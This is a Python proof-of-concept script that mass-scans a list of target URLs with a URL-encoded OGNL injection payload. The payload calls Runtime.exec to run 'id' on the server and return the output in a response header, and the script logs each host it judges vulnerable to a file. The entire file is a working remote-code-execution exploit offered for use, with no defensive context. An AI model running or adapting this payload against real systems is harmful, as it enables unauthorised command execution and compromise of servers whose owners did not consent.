import requests
import urllib3
from urllib import parse

requests.packages.urllib3.disable_warnings()

def poc():
	for url in open("target.txt"):
		url=url.strip()
		path="//%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/"
		vulnurl=url + path
		#print(vulnurl)
		headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",      
    }
		try:
			res=requests.get(vulnurl,headers=headers,verify=False,timeout=5)
			if "uid" in res.text and res.status_code==200:
				print(url+"is vuln 漏洞存在")
				f=open('./vul.txt','a')
				f.write(url)
				f.write('\n')
			else:
				print(url+"is not vuln 漏洞不存在")
		except Exception as e:
			print(e)

if __name__ == '__main__':
    poc()